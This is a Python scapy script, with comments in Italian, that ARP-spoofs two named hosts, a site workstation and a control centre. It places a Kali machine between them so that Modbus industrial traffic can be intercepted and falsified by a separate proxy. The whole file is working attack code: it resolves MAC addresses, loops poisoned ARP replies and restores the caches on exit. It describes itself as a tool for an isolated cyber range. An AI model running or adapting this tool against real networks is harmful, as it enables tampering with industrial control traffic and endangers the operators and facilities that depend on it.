#!/usr/bin/env python3
"""
ARP spoofing mirato (scapy) — mette la Kali in mezzo tra DUE soli host:
la workstation di sito e Centro. Serve a dirottare il traffico Modbus
(tcp/MODBUS_PORT) attraverso la Kali, dove il mitm_proxy lo falsifica.

Avvelena la cache ARP di entrambi:
  - dice a Centro che  <site_ip>  ha il MAC della Kali
  - dice al sito  che <central_ip> ha il MAC della Kali
Al termine (Ctrl-C / SIGTERM) ripristina le associazioni corrette.

NB: strumento per cyber range isolato. Scoping su due IP espliciti, nessuna
scansione di rete. Richiede root e la stessa L2 dei bersagli.

Uso:  sudo python3 arp_spoof.py --a <site_ip> --b <central_ip> [--iface eth0]
"""
import argparse
import signal
import sys
import time

from scapy.all import ARP, Ether, send, srp, conf


def mac_of(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=3, retry=3, iface=iface, verbose=0)
    for _, r in ans:
        return r.hwsrc
    raise SystemExit(f"[ARP] MAC non risolto per {ip} (host up? stessa L2?)")


def poison(target_ip, target_mac, spoof_ip, iface):
    # dice a target_ip che spoof_ip sta al nostro MAC
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),
         iface=iface, verbose=0)


def restore(a_ip, a_mac, b_ip, b_mac, iface):
    send(ARP(op=2, pdst=a_ip, hwdst=a_mac, psrc=b_ip, hwsrc=b_mac),
         iface=iface, count=3, verbose=0)
    send(ARP(op=2, pdst=b_ip, hwdst=b_mac, psrc=a_ip, hwsrc=a_mac),
         iface=iface, count=3, verbose=0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--a", required=True, help="IP workstation di sito")
    ap.add_argument("--b", required=True, help="IP Centro")
    ap.add_argument("--iface", default=conf.iface)
    args = ap.parse_args()

    a_mac = mac_of(args.a, args.iface)
    b_mac = mac_of(args.b, args.iface)
    print(f"[ARP] {args.a} = {a_mac} | {args.b} = {b_mac} | iface {args.iface}")

    def stop(*_):
        print("\n[ARP] ripristino cache ARP...")
        restore(args.a, a_mac, args.b, b_mac, args.iface)
        sys.exit(0)
    signal.signal(signal.SIGINT, stop)
    signal.signal(signal.SIGTERM, stop)

    print("[ARP] avvelenamento in corso (Ctrl-C per fermare)")
    while True:
        poison(args.b, b_mac, args.a, args.iface)   # a Centro: site=noi
        poison(args.a, a_mac, args.b, args.iface)   # al sito: Centro=noi
        time.sleep(2)


if __name__ == "__main__":
    main()
